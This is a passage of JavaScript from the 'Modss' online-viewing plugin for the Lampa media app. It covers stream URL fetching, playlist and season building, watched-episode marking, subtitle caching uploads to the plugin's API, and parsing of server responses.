        playData.url = params.url;
        _self.setFlowsForQuality(playData);
      }
    }
  };
  this.loadedInf = function (id, imdb, title, year, season, episode) {
    try {
      var _this = this;
      return;
      network.silent(API + 'loadedInf', function (json) {
        if (json.serial) {
          _this.downloadAndUploadArchive(json.url, id, imdb, season, episode, null).then(function (data) {
            console.log('Modss', 'loadedInf', (imdb || id), title, ' - загружены успешно:', data);
          }).catch(function (error) { console.error('Error:', error); });
        } else if (json.film) {
          for (var key in json.data) {
            if (json.data.hasOwnProperty(key)) {
              _this.downloadAndUploadArchive(json.data[key], id, imdb, null, null, key)
                .then(function (data) {
                  console.log('Modss', 'loadedInf', (imdb || id), key + ' загружен успешно:', data);
                })
                .catch(function (error) {
                  console.error('Modss', 'loadedInf', (imdb || id), title, ' - Ошибка при загрузке языка - ' + key, error);
                });
            }
          }
        }
      }, function (a, c) {
        Lampa.Noty.show('MODSs ОШИБКА loadedInf ' + network.errorDecode(a, c));
      }, {
        id: id,
        imdb: imdb,
        title: title,
        year: year,
        season: season,
        episode: episode,
        isSerial: season && episode ? true : false
      });

    } catch (error) {
      console.log('Modss error', id, season, episode, imdb, title, year, error)
    }
  };
  this.loadedInfV3 = function (id, imdb, title, year, season, episode) {
    try {
      var _this = this;
      return;
      network.silent(API + 'loadedInfV3', function (json) {
        if (json.serial) {
          // Если есть объект со всеми языками - грузим все по очереди
          if (json.all && typeof json.all === 'object') {
            for (var lang in json.all) {
              if (json.all.hasOwnProperty(lang)) {
                _this.downloadAndUploadArchiveV3(json.all[lang], id, imdb, season, episode, lang.toLowerCase())
                  .then(function (data) {
                    console.log('Modss', 'loadedInfV3', (imdb || id), title, ' - ' + lang + ' загружен успешно:', data);
                  })
                  .catch(function (err) {
                    console.error('Modss', 'loadedInfV3', (imdb || id), title, ' - ' + lang + ' ошибка:', err);
                  });
              }
            }
          } else if (json.url) {
            // Если нет all, грузим только по url
            _this.downloadAndUploadArchiveV3(json.url, id, imdb, season, episode, null).then(function (data) {
              console.log('Modss', 'loadedInfV3', (imdb || id), title, ' - загружены успешно:', data);
            }).catch(function (error) { 
              console.error('Error V3:', error);
            });
          }
        } else if (json.film) {
          for (var key in json.data) {
            if (json.data.hasOwnProperty(key)) {
              _this.downloadAndUploadArchiveV3(json.data[key], id, imdb, null, null, key.toLowerCase())
                .then(function (data) {
                  console.log('Modss', 'loadedInfV3', (imdb || id), key + ' загружен успешно:', data);
                })
                .catch(function (error) {
                  console.error('Modss', 'loadedInfV3', (imdb || id), title, ' - Ошибка при загрузке языка - ' + key, error);
                });
            }
          }
        }
      }, function (a, c) {
        Lampa.Noty.show('MODSs ОШИБКА loadedInfV3 ' + network.errorDecode(a, c));
      }, {
        id: id,
        imdb: imdb,
        title: title,
        year: year,
        season: season,
        episode: episode,
        isSerial: season && episode ? true : false
      });

    } catch (error) {
      console.log('Modss V3 error', id, season, episode, imdb, title, year, error)
    }
  };
  this.loadedInfSubtitles = function (id, imdb, title, year, season, episode, subtitles, balanserName) {
    try {
      if (!subtitles || !Lampa.Arrays.isArray(subtitles) || subtitles.length === 0) return;
      
      if (['alloha', 'mango', 'kinopub', 'collaps'].indexOf(balanserName) === -1) return;
      
      network.silent(API + 'getSub', function (filterResult) {
        if (filterResult && filterResult.alreadyExists || !filterResult || !filterResult.subtitles || filterResult.subtitles.length === 0) return;
        
        var downloadPromises = filterResult.subtitles.map(function (sub) {
          return new Promise(function (downloadResolve, downloadReject) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', sub.url, true);
            xhr.responseType = 'blob';
            xhr.timeout = 30000;
            
            xhr.onload = function () {
              if (xhr.status === 200) {
                var blob = xhr.response;
                
                if (blob.size === 0) {
                  downloadResolve(null);
                  return;
                }
                
                var formData = new FormData();
                var fileExt = sub.fileExt || '.srt';
                formData.append('subtitle_file', blob, 'subtitle' + fileExt);
                formData.append('subtitle_label', sub.label);
                formData.append('balanser', balanserName);
                formData.append('imdb_id', imdb);
                formData.append('id', id);
                if (season) formData.append('season', season);
                if (episode) formData.append('episode', episode);
                
                var xhr2 = new XMLHttpRequest();
                xhr2.open('POST', API + 'subsLoad', true);
                xhr2.timeout = 30000;
                
                xhr2.onload = function () {
                  if (xhr2.status === 200) {
                    try {
                      var response = JSON.parse(xhr2.responseText);
                      downloadResolve(response);
                    } catch (e) {
                      downloadResolve(null);
                    }
                  } else {
                    downloadResolve(null);
                  }
                };
                
                xhr2.onerror = function () {
                  downloadResolve(null);
                };
                
                xhr2.ontimeout = function () {
                  downloadResolve(null);
                };
                
                xhr2.send(formData);
              } else {
                downloadResolve(null);
              }
            };
            
            xhr.onerror = function () {
              downloadResolve(null);
            };
            
            xhr.ontimeout = function () {
              downloadResolve(null);
            };
            
            xhr.send();
          });
        });

        Promise.all(downloadPromises).then(function () {
        }).catch(function (error) {
        });
      }, function (a, c) {
      }, {
        user_id: user_id,
        uid: uid,
        subtitles: JSON.stringify(subtitles),
        balanser: balanserName,
        imdb_id: imdb,
        id: id,
        title: title,
        year: year,
        season: season || null,
        episode: episode || null,
        isSerial: season && episode ? true : false
      }, {
        dataType: 'json'
      });

    } catch (error) {
      console.log('Subtitles error', id, season, episode, imdb, title, year, error);
    }
  };
  this.fetchFileUrl = function (file, call) {
    var _this = this;
    Lampa.Loading.start(function () {
      Lampa.Loading.stop();
      Lampa.Controller.toggle('content');
      network.clear();
    });

    network["native"](file.url, function (json) {
      Lampa.Loading.stop();
      if (json && json.url) {
        if (file.subtitles && json.subtitles === false) {
          var jsonCopy = Object.assign({}, json);
          delete jsonCopy.subtitles;
          Object.assign(file, jsonCopy);
        } else {
          var mergedSubtitles = false;
          if (json.subtitles && Lampa.Arrays.isArray(json.subtitles)) {
            if (!Lampa.Arrays.isArray(file.subtitles)) file.subtitles = [];
            mergedSubtitles = file.subtitles.concat(json.subtitles);
          }
          Object.assign(file, json);
          if (mergedSubtitles && Lampa.Arrays.isArray(mergedSubtitles)) {
            json.subtitles = mergedSubtitles;
            file.subtitles = mergedSubtitles;
          }
        }
        
        if (json.url_reserve) _this.setFlowsForItem(json);
      }
      
      var subtitlesToProcess = json && json.subtitles ? json.subtitles : (file.subtitles || []);
      if (subtitlesToProcess && Array.isArray(subtitlesToProcess) && subtitlesToProcess.length > 0) {
        _this.loadedInfSubtitles(
          object.movie.id,
          object.movie.imdb_id,
          encodeURIComponent(object.movie.original_title || object.movie.original_name),
          ((object.movie.release_date || object.movie.first_air_date || '0000') + '').slice(0, 4),
          file.season,
          file.episode,
          subtitlesToProcess,
          balanser
        );
      }
      
      call(json, json);
    }, function () {
      Lampa.Loading.stop();
      call(false, {});
    });
  };
  this.getFileUrl = function (file, call, isContextMenu) {
    currentPlayItem = file;
    //this.loadedInfV3(object.movie.id, object.movie.imdb_id, encodeURIComponent(object.movie.original_title || object.movie.original_name), ((object.movie.release_date || object.movie.first_air_date || '0000') + '').slice(0, 4), file.season, file.episode);
    
    if (file.method == 'play' && file.subtitles && Array.isArray(file.subtitles) && file.subtitles.length > 0) {
      this.loadedInfSubtitles(
        object.movie.id,
        object.movie.imdb_id,
        encodeURIComponent(object.movie.original_title || object.movie.original_name),
        ((object.movie.release_date || object.movie.first_air_date || '0000') + '').slice(0, 4),
        file.season,
        file.episode,
        file.subtitles,
        balanser
      );
    }

    if (balanser == 'hdr' && navigator.userAgent.toLowerCase().indexOf('android') >= 0 && !Lampa.Platform.is('android')) return Lampa.Platform.install('apk');
    else if (isContextMenu && file.method == 'call' && file.url) {
      this.fetchFileUrl(file, call);
    }
    else if(Lampa.Storage.field('player') !== 'inner' && file.stream && Lampa.Platform.is('apple')){
		  var newfile = Lampa.Arrays.clone(file);
		  newfile.method = 'play';
		  newfile.url = file.stream;
		  newfile.quality = file.quality;
		  call(newfile, {});
	  } 
    else if (file.method == 'play') call(file, {});
    else this.fetchFileUrl(file, call);
  };
  this.getDefaultHandlers = function (videos) {
    var _this4 = this;
    return {
      onEnter: function onEnter(item, html) {
        _this4.getFileUrl(item, function (json, json_call) {
          if (json && json.url) {
            var playlist = [];
            item.isSeries = !!object.movie.name;
            var first = _this4.toPlayElement(item);
            first.ismodss = true;
            first.url = json.url;
            first.url_reserve = json.url_reserve;
            first.headers = json_call.headers || json.headers;
            var rawQuality = json_call.quality || json_call.qualitys || item.qualitys || json.quality;
            var rawQualityReserve = json_call.quality_reserve || item.quality_reserve || json.quality_reserve;
            first.quality = _this4.convertQualityToFormat(rawQuality);
            first.quality_reserve = rawQualityReserve ? _this4.convertQualityToFormat(rawQualityReserve) : undefined;
            first.subtitles = json.subtitles;
            if (json.segments) first.segments = json.segments;
            if (item.subtitles && item.subtitles.length && item.method == 'call' && json.subtitles) first.subtitles = json.subtitles.concat(item.subtitles);
            if (!first.subtitles) first.subtitles = item.subtitles;

            _this4.setDefaultQuality(first);
            if (true) {
              var currentSeason = null;
              videos.forEach(function (elem) {
                if (elem.season && elem.season !== currentSeason) {
                  currentSeason = elem.season;
                  playlist.push({
                    title: Lampa.Lang.translate('torrent_serial_season') + ' ' + currentSeason,
                    separator: true
                  });
                }

                elem.isSeries = !!object.movie.name;
                var cell = _this4.toPlayElement(elem);
                if (!item.season) cell.ismods = true;
                
                var image = elem.thumbnail;
                if (image && elem.isSeries) {
                  cell.template = 'selectbox_icon';
                  cell.icon = '<img class="size-youtube" src="' + image + '" alt="icon">';
                }
                if (elem == item) cell.url = json.url; else {
                  if (elem.method == 'call') {
                    if (Lampa.Storage.field('player') == 'android' && Lampa.Platform.is('android') || Lampa.Storage.field('player') !== 'inner' && Lampa.Platform.is('apple') && elem.stream) {
                      cell.url = elem.stream;
                    } else {
                      cell.url = function (call) {
                        _this4.getFileUrl(elem, function (stream, stream_json) {
                          if (stream.url) {
                            cell.url = stream.url;
                            cell.url_reserve = stream_json.url_reserve;
                            var rawCellQuality = stream_json.quality || json_call.qualitys || elem.qualitys;
                            var rawCellQualityReserve = stream_json.quality_reserve || elem.quality_reserve;
                            cell.quality = _this4.convertQualityToFormat(rawCellQuality);
                            cell.quality_reserve = rawCellQualityReserve ? _this4.convertQualityToFormat(rawCellQualityReserve) : undefined;
                            cell.subtitles = stream.subtitles;
                            if (stream.segments) cell.segments = stream.segments;
                            if (elem.subtitles && elem.subtitles.length && elem.method == 'call' && json.subtitles) cell.subtitles = stream.subtitles.concat(elem.subtitles);
                            if (!cell.subtitles) cell.subtitles = elem.subtitles;
                            cell.season = elem.season || 0;
                            cell.episode = elem.episode || 0;
                            cell.voice_name = elem.voice_name || '';
                            cell.translate = {
                              tracks: stream_json.audio_tracks,
                              subs: stream_json.subs_tracks
                            };
                            _this4.setDefaultQuality(cell);
                            setTimeout(function() {
                              _this4.setFlowsForItem(cell);
                            }, 500);
                            elem.mark();
                          } else {
                            cell.url = '';
                            Lampa.Noty.show(Lampa.Lang.translate('modss_nolink') + '<br>' + JSON.stringify(stream));
                          }
                          call();
                        }, function () {
                          cell.url = '';
                          call();
                        });
                      };
                    }
                  } else {
                    cell.url = elem.url;
                    cell.url_reserve = elem.url_reserve;
                    var rawCellQualityDirect = elem.qualitys || elem.quality;
                    var rawCellQualityReserveDirect = elem.quality_reserve;
                    cell.quality = rawCellQualityDirect ? _this4.convertQualityToFormat(rawCellQualityDirect) : undefined;
                    cell.quality_reserve = rawCellQualityReserveDirect ? _this4.convertQualityToFormat(rawCellQualityReserveDirect) : undefined;
                    cell.callLoadedInf = function() {
                      var subtitlesToProcess = elem.subtitles || [];
                      if (subtitlesToProcess && Array.isArray(subtitlesToProcess) && subtitlesToProcess.length > 0) {
                        _this4.loadedInfSubtitles(
                          object.movie.id,
                          object.movie.imdb_id,
                          encodeURIComponent(object.movie.original_title || object.movie.original_name),
                          ((object.movie.release_date || object.movie.first_air_date || '0000') + '').slice(0, 4),
                          elem.season,
                          elem.episode,
                          subtitlesToProcess,
                          balanser
                        );
                      }
                    };
                  }
                }
                _this4.setDefaultQuality(cell);
                playlist.push(cell);
              });
            } else playlist.push(first);

            var playlistToPass = videos.length > 1 ? playlist : [];
            if (playlist.length > 1) first.playlist = playlist;
            if (first.url) {
              var plLimit = 300;
              if (playlistToPass.length > 0 && Lampa.Storage.field('player') !== 'inner' && videos.length > plLimit) {
                var itemIdx = videos.indexOf(item);
                if (itemIdx >= 0) {
                  var vidStart = itemIdx;
                  var vidEnd = Math.min(videos.length, itemIdx + plLimit);
                  var cellCount = 0;
                  var plStart = -1, plEnd = playlist.length;
                  for (var pi = 0; pi < playlist.length; pi++) {
                    if (playlist[pi].separator) continue;
                    if (cellCount === vidStart) plStart = pi;
                    cellCount++;
                    if (cellCount === vidEnd) {
                      plEnd = pi + 1;
                      break;
                    }
                  }
                  if (plStart >= 0) {
                    playlistToPass = playlist.slice(plStart, plEnd);
                    first.playlist = playlistToPass;
                  }
                }
              }
              Lampa.Player.play(first);
              Lampa.Player.playlist(playlistToPass);
              _this4.setFlowsForItem(first);
              _this4.updateBalanser(balanser);

              item.mark();
            } else {
              Lampa.Noty.show(Lampa.Lang.translate('modss_nolink') + '<br>' + JSON.stringify(json));
            }
            Lampa.Player.render().find('.player-info__values').show();
          } else {
            Lampa.Noty.show(json && json.vip ? json.vip.title + '<br>' + json.vip.msg : Lampa.Lang.translate('modss_nolink') + '<br>' + JSON.stringify(json));
          }
        }, true);
      },
      onContextMenu: function onContextMenu(item, html, data, call) {
        _this4.getFileUrl(item, function (stream) {
          var quality = stream.quality || stream.qualitys || item.qualitys || false;
          var reserve_quality = stream.quality_reserve || item.quality_reserve || false;

          call({
            file: stream.url || stream.file || stream.stream || stream,
            quality: typeof quality === 'object' ? quality : false,
            reserve_quality: typeof reserve_quality === 'object' ? reserve_quality : false
          });
        }, true);
      }
    };
  };
  this.groupItemsBySeason = function (items) {
    var groups = [];
    var currentSeason = null;
    var currentGroup = [];

    items.forEach(function (item) {
      if (item.season !== currentSeason) {
        if (currentGroup.length > 0) {
          groups.push(currentGroup);
        }
        currentSeason = item.season;
        currentGroup = [item];
      } else {
        currentGroup.push(item);
      }
    });

    if (currentGroup.length > 0) {
      groups.push(currentGroup);
    }

    return groups;
  };
  this.display = function (videos) {
    var _this4 = this;
    var choice = _this4.getChoice();
    allItemsToDisplay = videos || [];

    if (choice.season === -1) {
      allRenderedItems = [];
      seasonGroups = [];
      page = 0;
      last = false;
      isLoadingMore = false;

      seasonGroups = this.groupItemsBySeason(videos);

      scroll.clear();
      scroll.reset();
      this.next(this.getDefaultHandlers(videos));
    } else {
      this.draw(videos, this.getDefaultHandlers(videos));
    }
    

    this.filter({
      season: filter_find.season.map(function (s) {
        return s;
      }),
      voice: filter_find.voice.map(function (b) {
        return b.title || b;
      }),
      order: (object.movie.number_of_seasons ? this.order.map(function (b) {
        return b.title;
      }) : ''),
      type: (filter_find.type.length ? filter_find.type.map(function (b) {
        return b;
      }) : ''),
      server: (filter_find.server.length ? filter_find.server.map(function (b) {
        return b;
      }) : ''),
    }, this.getChoice());
  };
  this.next = function () {
    var _this4 = this;
    var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

    var choice = _this4.getChoice();
    var serial = object.movie.name ? true : false;

    if (isLoadingMore || page >= seasonGroups.length) return;

    isLoadingMore = true;

    if (page === 0) {
      scroll.append(Lampa.Template.get('modss_online_watched', {}));
      _this4.updateWatched();
      shouldLoadToLastWatched = _this4.checkLastWatchedInAllSeasons();
    }

    var currentSeasonItems = seasonGroups[page];
    if (!currentSeasonItems || !currentSeasonItems.length) {
      isLoadingMore = false;
      return;
    }

    if (!params || Object.keys(params).length === 0) {
      params = this.getDefaultHandlers(allItemsToDisplay);
    }

    var seasonNumber = currentSeasonItems[0].season;
    this.getEpisodes(seasonNumber, choice, function (episodes) {
      _this4.appendSeason(seasonNumber);

      currentSeasonItems.forEach(function (item) {
        _this4.appendEpisode(item, episodes, choice, currentSeasonItems, params);
      });

      if (serial && !params.similars && choice.season !== -1 && episodes.length > currentSeasonItems.length) {
        var currentSeason = currentSeasonItems[0] ? currentSeasonItems[0].season : 1;
        var left = episodes.slice(currentSeasonItems.length);
        left.forEach(function (episode) {
          _this4.appendMissingEpisode(episode, currentSeason);
        });
      }

      page++;
      isLoadingMore = false;
      
      var lastWatchedSeason = _this4.getLastWatchedSeason();
      var currentLoadedSeason = seasonNumber;
      
      if (shouldLoadToLastWatched && lastWatchedSeason > 0 && currentLoadedSeason < lastWatchedSeason) {
        // Продолжаем загрузку только если еще не дошли до нужного сезона
        setTimeout(function () {
          if (page < seasonGroups.length) _this4.next(params);
          else Lampa.Controller.enable('content');
        }, 50);
      } else {
        shouldLoadToLastWatched = false;
        Lampa.Controller.enable('content');
      }
    });
  };
  this.checkLastWatchedInAllSeasons = function () {
    var choice = this.getChoice();
    var serial = object.movie.name ? true : false;
    
    if (!serial || !choice.episodes_view) return false;
    
    for (var season in choice.episodes_view) {
      if (choice.episodes_view[season] > 0) {
        return true;
      }
    }
    return false;
  };
  this.getLastWatchedSeason = function () {
    var choice = this.getChoice();
    if (!choice.episodes_view) return 0;
    var lastWatchedSeason = 0;
    
    if (lastWatchedSeason === 0) {
      var maxEpisode = 0;
      for (var season in choice.episodes_view) {
        var seasonNum = parseInt(season);
        var episode = choice.episodes_view[season];
        if (episode > 0) {
          // Берем сезон с максимальным номером эпизода как последний
          if (episode > maxEpisode || (episode === maxEpisode && seasonNum > lastWatchedSeason)) {
            maxEpisode = episode;
            lastWatchedSeason = seasonNum;
          }
        }
      }
    }
    
    return lastWatchedSeason;
  };
  this.appendEpisode = function (element, episodes, choice, items, params, is_append) {
    var index = element.episode - 1;
    var _this4 = this;
    var viewed = Lampa.Storage.cache('online_view', 5000, []);
    var serial = object.movie.name ? true : false;
    var fully = window.innerWidth > 480;

    var scroll_to_element = false;
    var scroll_to_mark = false;

    var more = object.movie.original_language == 'ja' && episodes.length > items.length && (object.movie.number_of_seasons < choice.seasons);
    var ismore = true;
    if (more) {
      var ep = more ? episodes.slice(items.length) : episodes;
      ismore = items[items.length - 1].episode >= episodes[ep.length].episode_number;
      if (ismore) ep = episodes.slice(items.length - ((episodes.length - items.length) < items.length - 1 ? 2 : 1));
    }

    var episodee = serial && episodes.length && !params.similars ? ((ismore && more) ? ep : episodes).find(function (e, i) {
      return (ismore && more) ? index == i : ((e.episode_number || e.number) == element.episode);
    }) : false;

    var episode = false;
    if (serial && episodes.length && !params.similars) {
      if (object.movie.source == 'pub' && episodes[0] && episodes[0].season !== undefined && episodes[0].episodes) {
        var seasonData = episodes.find(function (s) {
          return s.season == element.season;
        });
        if (seasonData && seasonData.episodes) {
          episode = seasonData.episodes.find(function (e) {
            return (e.episode_number || e.number) == element.episode;
          });
        }
      } else {
        episode = episodes.find(function (e, i) {
          return (e.episode_number || e.number) == element.episode;
        });
      }
    }

    var episode_num = element.episode || index + 1;
    var episode_last = choice.episodes_view[element.season];

    
    Lampa.Arrays.extend(element, {
      serv: (element.serv ? element.serv : ''),
      info: '',
      quality: '',
      bitrate: '',
      time: Lampa.Utils.secondsToTime((episode ? episode.runtime : object.movie.runtime) * 60, true)
    });
    
    if (element.sizeB) element.bitrate = Lampa.Utils.calcBitrate(element.sizeB, episode ? episode.runtime : object.movie.runtime) + ' ' + Lampa.Lang.translate('torrent_item_mb') + ' - ';

    var hash_timeline = Lampa.Utils.hash(serial ? [element.season, element.season > 10 ? ':' : '', element.episode, object.movie.original_title].join('') : object.movie.original_title);
    var hash_behold = Lampa.Utils.hash(serial ? [element.season, element.season > 10 ? ':' : '', element.episode, object.movie.original_title, element.voice_name].join('') : object.movie.original_title + element.title);
    var data = {
      hash_timeline: hash_timeline,
      hash_behold: hash_behold
    };
    var info = [];

    if (serial) {
      element.translate_episode_end = _this4.getLastEpisode(items);
      element.translate_voice = element.voice_name;
    }

    element.timeline = Lampa.Timeline.view(hash_timeline);
    if (episode) {
      element.title = (element.episode_name || episode.name || episode.title || element.title);
      if (!element.info && episode.vote_average) info.push(Lampa.Template.get('modss_online_rate', {
        rate: parseFloat(episode.vote_average + '').toFixed(1)
      }, true));
      
      if(serial) {
        if (episode.air_date && fully && !(element.info.title || element.info).includes(Lampa.Utils.parseTime(episode.air_date).full)) info.push(Lampa.Utils.parseTime(episode.air_date).full);
      } else if (object.movie.release_date && object.movie.release_date.length > 4 && fully) {
        info.push(Lampa.Utils.parseTime(object.movie.release_date).full);
      }
    }
    
    if (!serial && object.movie.tagline && element.info.length < 30 && !(window.innerWidth < 920 && balanser == 'hdr')) info.push(object.movie.tagline);
    
    if (element.info) info.push(element.info.title || element.info);
    if (element.voice_name && !(element.info.title || element.info).includes(element.voice_name)) info.push(element.voice_name);
    if (info.length) element.info = info.map(function (i) {
      return '<span>' + i + '</span>';
    }).join('<span class="online_modss-split">●</span>');
    
    var html = Lampa.Template.get('modss_online_full', element);
    var loader = html.find('.online_modss__loader');
    var image = html.find('.online_modss__img');

    if (!serial) {
      if (choice.movie_view == hash_behold) scroll_to_element = html;
    } else if (typeof episode_last !== 'undefined' && episode_last == episode_num) {
      scroll_to_element = html;
      var cont = _this4.getChoice();
      if (Lampa.Storage.field('online_continued') && cont && cont.continued) {
        cont.continued = false;
        _this4.replaceChoice(cont, balanser);
        setTimeout(function () {
          $(html).trigger('hover:enter');
        }, 50);
      }
    }

    if (serial && episode_num && filter_find.type && filter_find.type.length) image.append('<div class="online_modss__type-video">' + element.type + '</div>');
    if (serial && episode_num && filter_find.season.length) image.append('<div class="online_modss__episode-number-season">S' + (element.season || episode && (episode.snumber || episode.season_number) || 0) + ':E' + (element.episode || episode && (episode.number || episode.episode_number) || 0) + '</div>');

    if (!element.img && serial && !episode && filter_find.season.length) {
      image.append('<div class="online_modss__episode-number">' + ('0' + episode_num).slice(-2) + '</div>');
      loader.remove();
    } else {
      var img = html.find('img')[0];

      img.onerror = function () {
        img.src = './img/img_broken.svg';
      };

      img.onload = function () {
        image.addClass('online_modss__img--loaded');
        loader.remove();
      };
      img.src = object.movie.source == 'filmix' ? object.movie.img : 
        object.movie.source == 'pub' ? (episode && episode.thumbnail || object.movie.background_image) : 
        element.img ? element.img : element.thumbnail ? element.thumbnail : Lampa.TMDB.image('t/p/w300' + (episode ? episode.still_path : object.movie.backdrop_path));
      element.thumbnail = img.src;
    }

    html.find('.online_modss__timeline').append(Lampa.Timeline.render(element.timeline));

    if (Lampa.Timeline.details) html.find('.online_modss__timeline').append(Lampa.Timeline.details(element.timeline));
    if (element.subtitles) html.find('.online_modss__img').append('<div class="online-prestige__viewed online_modss__subtitle">' + Lampa.Template.get('icon_subs', {}, true) + '</div>');
    if (viewed.indexOf(hash_behold) !== -1) {
      scroll_to_mark = html;
      html.find('.online_modss__img').append('<div class="online-prestige__viewed online_modss__viewed">' + Lampa.Template.get('icon_viewed', {}, true) + '</div>');
    }

    element.mark = function () {
      viewed = Lampa.Storage.cache('online_view', 5000, []);

      if (viewed.indexOf(hash_behold) == -1) {
        viewed.push(hash_behold);
        Lampa.Storage.set('online_view', viewed);

        if (html.find('.online_modss__viewed').length == 0) {
          html.find('.online_modss__img').append('<div class="online-prestige__viewed online_modss__viewed">' + Lampa.Template.get('icon_viewed', {}, true) + '</div>');
        }
      }

      choice = _this4.getChoice();
      if (!serial) {
        choice.movie_view = hash_behold;
      } else {
        choice.episodes_view[element.season] = episode_num;
      }

      _this4.saveChoice(choice);
      _this4.new_seria();

      try {
        _this4.watched({
          balanser: balanser,
          balanser_name: sources[balanser].name,
          voice_id: choice.voice_id,
          voice_name: choice.voice_name || element.voice_name || element.title,
          episode: element.episode,
          season: element.season
        });
      } catch (error) {
        console.log({
          err: error,
          bal: sources[balanser]
        });
      }
    };

    element.unmark = function () {
      viewed = Lampa.Storage.cache('online_view', 5000, []);

      if (viewed.indexOf(hash_behold) !== -1) {
        Lampa.Arrays.remove(viewed, hash_behold);
        Lampa.Storage.set('online_view', viewed);
        if (Lampa.Manifest.app_digital >= 177) Lampa.Storage.remove('online_view', hash_behold);
        html.find('.online_modss__viewed').remove();

        choice = _this4.getChoice();
        if (!serial && choice.movie_view === hash_behold) {
          choice.movie_view = '';
          _this4.saveChoice(choice);
        } else if (serial && choice.episodes_view[element.season]) {
          delete choice.episodes_view[element.season];
          _this4.saveChoice(choice);
        }
        _this4.new_seria();
      }
    };

    element.timeclear = function () {
      element.timeline.percent = 0;
      element.timeline.time = 0;
      element.timeline.duration = 0;
      Lampa.Timeline.update(element.timeline);

      choice = _this4.getChoice();
      if (!serial && choice.movie_view === hash_behold) {
        choice.movie_view = '';
        _this4.saveChoice(choice);
      } else if (serial && choice.episodes_view[element.season]) {
        delete choice.episodes_view[element.season];
        _this4.saveChoice(choice);
      }

      _this4.new_seria();
    };

    html.on('hover:enter', function () {
      if (object.movie.id) Lampa.Favorite.add('history', object.movie, 100);
      if (params.onEnter) params.onEnter(element, html, data);
    });
    html.on('hover:focus', function (e) {
      last = e.target;
      if (typeof element.voice == 'string' && element.voice) {
        $('.voices').remove();
        $('.explorer-card__descr').hide().after('<div class="voices"></div>');
        $('.voices').html(Lampa.Lang.translate('<b>#{torrent_parser_voice}:</b><br>' + element.voice));
        if($('.explorer-card__head-img').find('.arrow-down').length == 0) $('.explorer-card__head-img').append('<span class="arrow-down"></span>');
      } else  $('.voices, .arrow-down').remove();
      
      scroll.update($(e.target), true);
    });

    if (params.onRender) params.onRender(element, html, data);

    _this4.contextMenu({
      html: html,
      element: element,
      onFile: function onFile(call) {
        if (params.onContextMenu) params.onContextMenu(element, html, data, call);
      },
      onClearAllMark: function onClearAllMark() {
        allRenderedItems.forEach(function (elem) {
          elem.unmark();
        });
      },
      onClearAllTime: function onClearAllTime() {
        allRenderedItems.forEach(function (elem) {
          elem.timeclear();
        });
      }
    });

    allRenderedItems.push(element);

    scroll.append(html);

    if(is_append) Lampa.Controller.collectionAppend(html);

    if (scroll_to_element) {
      targetScrollElement = scroll_to_element[0];
      last = targetScrollElement;
    } else if (scroll_to_mark && !targetScrollElement) {
      targetScrollElement = scroll_to_mark[0];
      last = targetScrollElement;
    }

  };
  this.parse = function (json) {
    try {
      var _this = this;
      finalItems = [];
      if (json.folder || json.similars || json.episode) {
        extract = json;
      }
      var find_s, find_v, voice;
      var choice = this.getChoice(balanser);
      var select_voice = choice.voice_name;
      var select_season = choice.season;
      var items = extract.folder || extract.episode;

      // Серверный кеш фильма ещё не готов — полный перезапуск экрана (как при смене балансера)
      if (json.error && json.message === "balanser cache is Empty") {
        var self = this;
        if (balancer_cache_empty_retries >= 5) {
          balancer_cache_empty_retries = 0;
          return this.doesNotAnswer(object.search);
        }
        balancer_cache_empty_retries++;
        clearTimeout(balancer_cache_empty_timer);
        balancer_cache_empty_timer = setTimeout(function () {
          if (Lampa.Activity.active().activity === self.activity) {
            Lampa.Activity.replace();
          }
        }, 1000);
        return;
      }
      balancer_cache_empty_retries = 0;

      if (extract.similars) {
        this.activity.loader(false);
        this.similars(extract.results);
      } else if (json.vip || json.error) return this.noConnectToServer(json);
      else if (!items || !Lampa.Arrays.getKeys(items).length) {
        console.log('Modss', 'items NULL', items);
        return this.doesNotAnswer(object.search);
      } else {
        if (extract && extract.season && extract.season.length) {
          if (typeof extract.season[0] === 'object' && extract.season[0].url) {
            filter_find.season = extract.season;
          } else {
            filter_find.season = extract.season.map(function (s) {
              return s.name || s.title || s;
            }).filter(function (season) {
              return season !== Lampa.Lang.translate('all_seasons');
            });
          }
          Lampa.Activity.active().activity.render().find('.filter--filter').show();
        }
        if (extract && extract.server) filter_find.server = extract.server;
        if (extract && extract.type) filter_find.type = extract.type;

        if (filter_find.season && filter_find.season.length) {
          filter_find.season = filter_find.season.sort(function (a, b) {
            var aTitle = (typeof a === 'object') ? (a.title || a.name) : a;
            var bTitle = (typeof b === 'object') ? (b.title || b.name) : b;
            var aNum = parseInt((aTitle + '').split(' ').pop());
            var bNum = parseInt((bTitle + '').split(' ').pop());
            return isNaN(aNum) ? 1 : isNaN(bNum) ? -1 : aNum - bNum;
          });
        }

        var season;
        if (select_season === -1) {
          season = Lampa.Lang.translate('all_seasons');
        } else {
          var seasonObj = filter_find.season[select_season];
          season = typeof seasonObj === 'object' ? (seasonObj.title || seasonObj.name || Lampa.Lang.translate('season_prefix') + (select_season + 1)) : seasonObj;
        }
        if (!season) {
          var firstSeason = filter_find.season[0];
          season = typeof firstSeason === 'object' ? (firstSeason.title || firstSeason.name || Lampa.Lang.translate('season_one')) : firstSeason || Lampa.Lang.translate('all_seasons');
        }

        if ((Lampa.Arrays.getKeys(items)[1] && isNaN(Lampa.Arrays.getKeys(items)[1]) || isNaN(Lampa.Arrays.getKeys(items)[0])) && extract.voice) {
          filter_find.voice = [];
          var sNum = season !== Lampa.Lang.translate('all_seasons') && typeof season === 'string' ? season.split(' ').pop() : null;

          if (items) {
            var itemsKeys = Lampa.Arrays.getKeys(items);
            var isDirectSeasonMapping = itemsKeys.length > 0 && itemsKeys.every(function (key) {
              return !isNaN(key) && Lampa.Arrays.isArray(items[key]);
            });

            if (isDirectSeasonMapping) {
              filter_find.voice = [];
            } else {
              for (var name in items) {
                if (items.hasOwnProperty(name)) {
                  var elements = sNum ? (items[name] && items[name][sNum]) : [].concat.apply([], Lampa.Arrays.getValues(items[name]));
                  if (Lampa.Arrays.isArray(elements) && elements.length && elements[0]) {
                    var voiceName = elements[0].voice_name;
                    if (voiceName && typeof voiceName === 'string' && filter_find.voice.indexOf(voiceName) === -1) {
                      filter_find.voice.push(voiceName);
                    }
                  }
                }
              }
            }
          }
        }

        if (!filter_find.voice.length && sNum && items) {
          for (var name in items) {
            if (items.hasOwnProperty(name)) {
              var allElements = [].concat.apply([], Lampa.Arrays.getValues(items[name]));
              if (Lampa.Arrays.isArray(allElements) && allElements.length && allElements[0]) {
                var voiceName = allElements[0].voice_name;
